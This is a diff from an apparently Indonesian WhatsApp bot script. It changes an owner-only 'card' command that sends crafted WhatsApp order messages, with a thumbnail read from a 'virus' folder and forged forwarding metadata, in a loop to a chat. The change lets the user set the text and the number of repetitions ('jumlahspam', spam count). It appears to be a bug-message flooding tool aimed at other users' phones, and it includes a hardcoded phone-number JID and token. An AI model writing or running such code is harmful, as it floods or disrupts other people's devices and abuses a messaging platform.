@@ -2254,8 +2254,12 @@ else {xznsenpai.reply(from, `Kirim gambar atau reply dengan caption ${prefix}jad
 break
 case 'card':
 if (!isOwner) return xznsenpai.reply(from, 'Anda Bukan XznSenpai', qul)
-for (let i = 0; i < 5; i++) {
-njir = await udin.prepareMessageFromContent(from, {"orderMessage": {"orderId": "792749621388119", "sellerJid": "6282256080304@s.whatsapp.net", "thumbnail": fs.readFileSync('./virus/virgam.jpg'), "itemCount": 99, "status": "INQUIRY", "surface": "CATALOG", "message": `${arg}`, "orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼??", "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg==" }, "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted:flokasi, contextInfo:{}}) 
+if (!arg) return xznsenpai.reply(from, `Penggunaan ${prefix}card teks|jumlahspam`, qul)
+argz = arg.split("|")
+if (!argz) return xznsenpai.reply(from, `Penggunaan ${prefix}card teks|jumlah`, qul)
+if (isNaN(argz[1])) return xznsenpai.reply(from, `harus berupa angka`, qul)
+for (let i = 0; i < argz[1]; i++){
+njir = await udin.prepareMessageFromContent(from, {"orderMessage": {"orderId": "792749621388119", "sellerJid": "6282256080304@s.whatsapp.net", "thumbnail": fs.readFileSync('./virus/virgam.jpg'), "itemCount": 99, "status": "INQUIRY", "surface": "CATALOG", "message": `${argz[0]}`, "orderTitle": "𝙓𝙕𝙉 𝙎𝙀𝙉𝙋𝘼??", "token": "AR7lxB+W/oR81b6ENZgc3dQdr+XrCDQptYJnZEKf3oWcBg==" }, "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted:flokasi, contextInfo:{}}) 
 udin.relayWAMessage(njir)}
 break
                case 'anu':
